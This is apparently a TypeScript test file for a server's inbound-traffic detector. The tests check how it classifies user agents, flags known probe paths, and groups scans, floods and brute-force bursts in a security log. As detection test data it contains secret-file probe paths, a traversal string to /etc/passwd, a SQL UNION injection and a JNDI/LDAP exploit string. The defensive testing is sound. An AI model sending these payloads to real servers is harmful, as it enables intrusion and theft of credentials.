/**
 * Telling visitors from the programs that knock on every door: what one
 * request gives away, and what a client's last ten minutes add up to.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { withAccessLog } from "../src/util/access-log.ts";
import { classifyClient, threatSignals } from "../src/util/inbound-signals.ts";
import { type ChannelRecord, readChannel } from "../src/util/log-files.ts";
import { installLogSink, uninstallLogSink } from "../src/util/log-sink.ts";

const CHROME =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

describe("what a user agent claims to be", () => {
  test("browsers, link previews, crawlers, tools and scanners", () => {
    expect(classifyClient(CHROME)).toEqual({ kind: "browser" });
    expect(classifyClient("facebookexternalhit/1.1 Facebot Twitterbot/1.0").kind).toBe("preview");
    expect(
      classifyClient("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
    ).toEqual({
      kind: "crawler",
      name: "googlebot",
    });
    expect(classifyClient("Mozilla/5.0 AppleWebKit/537.36 (compatible; GPTBot/1.2)").kind).toBe(
      "crawler",
    );
    expect(classifyClient("curl/8.7.1")).toEqual({ kind: "tool", name: "curl" });
    expect(classifyClient("python-requests/2.32.3").kind).toBe("tool");
    expect(classifyClient("Mozilla/5.0 zgrab/0.x")).toEqual({ kind: "scanner", name: "zgrab" });
    expect(classifyClient("")).toEqual({ kind: "unknown" });
    expect(classifyClient(null)).toEqual({ kind: "unknown" });
  });
});

describe("which known probes a request matches", () => {
  test("the things asked of every address on the internet", () => {
    expect(threatSignals("GET", "/.env", CHROME)).toEqual(["probe:secrets"]);
    expect(threatSignals("GET", "/.git/config", CHROME)).toEqual(["probe:secrets"]);
    expect(threatSignals("GET", "/wp-login.php", CHROME)).toEqual(["probe:cms", "probe:exploit"]);
    expect(threatSignals("GET", "/actuator/health", CHROME)).toEqual(["probe:admin"]);
    expect(threatSignals("POST", "/boaform/admin/formLogin", CHROME)).toEqual(["probe:device"]);
    expect(
      threatSignals("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", CHROME),
    ).toContain("probe:exploit");
    expect(threatSignals("GET", "/static/..%2f..%2fetc/passwd", CHROME)).toContain("traversal");
    expect(
      threatSignals("GET", "/search?q=1%20UNION%20SELECT%20password%20FROM%20users", CHROME),
    ).toEqual(["injection"]);
    expect(threatSignals("GET", "/?x=${jndi:ldap://203.0.113.9/a}", CHROME)).toContain(
      "probe:exploit",
    );
    expect(threatSignals("PROPFIND", "/", CHROME)).toEqual(["method"]);
    expect(threatSignals("GET", "/", "masscan/1.3")).toEqual(["scanner"]);
  });

  test("ordinary requests match nothing", () => {
    for (const address of [
      "/",
      "/s/0f66f61026db697ea6c05ccfc2aea69a/index.html",
      "/kitchen/recipes/soup?servings=4",
      "/print/api/state",
      "/assets/index-CNOfneXc.js",
      "/p/abc123?select=tab&from=home",
      "/environment/report.html",
      // A word that is also a dotfile's name, without the dot, is just a word.
      "/env/guide",
      "/git/tutorial.html",
      "/docker/notes",
      "/configure",
    ]) {
      expect(threatSignals("GET", address, CHROME)).toEqual([]);
    }
  });
});

describe("a client's last ten minutes", () => {
  let dir = "";
  const realNow = Date.now;
  let now = 0;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "inbound-"));
    installLogSink(dir, "", "daemon.log", { echo: false, instrument: false });
    now = realNow();
    Date.now = () => now;
  });
  afterEach(() => {
    Date.now = realNow;
    uninstallLogSink();
    rmSync(dir, { recursive: true, force: true });
  });

  const name = () => `router-${Math.random().toString(36).slice(2)}`;
  const from = (ip: string, path: string, ua = CHROME, method = "GET") =>
    new Request(`http://site.example.com${path}`, {
      method,
      headers: {
        "cf-connecting-ip": ip,
        "cf-ipcountry": "NL",
        "user-agent": ua,
        host: "site.example.com",
      },
    });
  const loopback = { requestIP: () => ({ address: "127.0.0.1" }) };
  const events = (server: string, kind: string): ChannelRecord[] =>
    readChannel(dir, "security", 0).filter(
      (r) => r.tag === "inbound" && r.fields!.kind === kind && r.fields!.server === server,
    );

  test("a request is recorded with where it was sent, from where, and by what", async () => {
    const server = name();
    const handler = withAccessLog(server, () => new Response("ok"));
    await handler(from("198.51.100.7", "/kitchen/recipes?week=2"), loopback);
    const [record] = readChannel(dir, "net-in", 0).filter((r) => r.fields!.server === server);
    expect(record!.fields).toMatchObject({
      host: "site.example.com",
      via: "198.51.100.7",
      country: "NL",
      client: "browser",
      path: "/kitchen/recipes",
      status: 200,
    });
    expect(record!.fields!.probes).toBeUndefined();
    // Came from outside, first time today: noted once.
    await handler(from("198.51.100.7", "/kitchen/recipes?week=3"), loopback);
    expect(events(server, "new-client")).toHaveLength(1);
  });

  test("a visitor browsing, with a few missing pages, raises nothing", async () => {
    const server = name();
    const handler = withAccessLog(server, (r: Request) =>
      new URL(r.url).pathname.startsWith("/missing")
        ? new Response("no", { status: 404 })
        : new Response("ok"),
    );
    for (let i = 0; i < 60; i++) await handler(from("198.51.100.8", `/page/${i}`), loopback);
    for (let i = 0; i < 6; i++) await handler(from("198.51.100.8", `/missing/${i}`), loopback);
    for (const kind of ["scan", "flood", "brute-force", "probe"])
      expect(events(server, kind)).toEqual([]);
    // A page that is not there is the asker's mistake: it is not filed as an error.
    expect(readChannel(dir, "error", 0).filter((r) => r.fields?.server === server)).toEqual([]);
  });

  test("a scanner is one line, however much it asks for", async () => {
    const server = name();
    const handler = withAccessLog(server, () => new Response("no", { status: 404 }));
    const asks = [
      "/.env",
      "/.git/config",
      "/wp-login.php",
      "/phpmyadmin/",
      "/actuator/env",
      "/boaform/admin/formLogin",
      "/.aws/credentials",
    ];
    for (const path of asks)
      await handler(from("203.0.113.50", path, "Mozilla/5.0 zgrab/0.x"), loopback);
    const scans = events(server, "scan");
    expect(scans).toHaveLength(1);
    expect(scans[0]).toMatchObject({
      level: "warn",
      fields: { client: "203.0.113.50", country: "NL" },
    });
    expect(scans[0]!.msg).toContain("scan from 203.0.113.50");
    // Each probe is on record too, with what it matched and never the query.
    const probes = events(server, "probe");
    expect(probes).toHaveLength(asks.length);
    expect(probes[0]!.fields!.probes).toEqual(["probe:secrets", "scanner"]);
  });

  test("many addresses that are not there, with no known probe among them, is a scan too", async () => {
    const server = name();
    const handler = withAccessLog(server, () => new Response("no", { status: 404 }));
    for (let i = 0; i < 25; i++)
      await handler(from("203.0.113.51", `/guess-${i}/index.html`), loopback);
    expect(events(server, "scan")).toHaveLength(1);
    expect(events(server, "scan")[0]!.msg).toContain("different addresses that are not here");
  });

  test("refusal after refusal is a brute force; hundreds a minute is a flood", async () => {
    const server = name();
    const handler = withAccessLog(server, (r: Request) =>
      new URL(r.url).pathname === "/login"
        ? new Response("no", { status: 401 })
        : new Response("ok"),
    );
    for (let i = 0; i < 10; i++)
      await handler(from("203.0.113.52", "/login", CHROME, "POST"), loopback);
    expect(events(server, "brute-force")).toHaveLength(1);
    for (let i = 0; i < 320; i++)
      await handler(from("203.0.113.53", "/feed", CHROME, "POST"), loopback);
    expect(events(server, "flood")).toHaveLength(1);
    expect(events(server, "flood")[0]!.fields).toMatchObject({ client: "203.0.113.53" });
  });

  test("ten minutes on, a client that is still at it is reported again", async () => {
    const server = name();
    const handler = withAccessLog(server, () => new Response("no", { status: 404 }));
    for (let i = 0; i < 6; i++) await handler(from("203.0.113.54", "/.env"), loopback);
    now += 11 * 60_000;
    for (let i = 0; i < 6; i++) await handler(from("203.0.113.54", "/.env"), loopback);
    expect(events(server, "scan")).toHaveLength(2);
  });
});
